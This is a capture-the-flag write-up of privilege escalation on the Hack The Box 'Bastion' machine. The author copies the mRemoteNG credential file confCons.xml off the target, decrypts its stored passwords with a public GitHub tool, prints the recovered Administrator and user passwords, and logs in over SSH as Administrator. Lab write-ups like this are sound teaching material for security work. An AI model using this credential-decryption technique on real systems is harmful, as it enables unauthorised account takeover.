
I found an running mRemoteNG Application which is an remote management tool which allows users to store credentials for many connections.

The Priv Esc is very simple. We can find an interesting config file in which there is credentials stored, including an encoded password.

```
C:\Users\L4mpje\AppData\Roaming\mRemoteNG\confCons.xml
```

This gave us a lot of information. The password of the Administrator User is encrypted with AES. 

We can utilize an tool called mremoteng_decrypt.py which we can get from GitHub

```
git clone https://github.com/kmahyyg/mremoteng-decrypt.git
```

Downloaded the necessary config file onto local machine using scp.

```
scp 'L4mpje@10.129.136.29:C:/Users/L4mpje/appData/Roaming/mRemoteNG/confCons.xml' .
```

Ran the decryptor and gained credentials.

```
python3 mremoteng_decrypt.py -rf /ctfs/htb/windows/bastion/confCons.xml 
Username: Administrator
Hostname: 127.0.0.1
Password: thXLHM96BeKL0ER2 

Username: L4mpje
Hostname: 192.168.1.75
Password: bureaulampje
```

Connected to the target server as "Administrator" user.

```
ssh Administrator@10.129.136.29
```
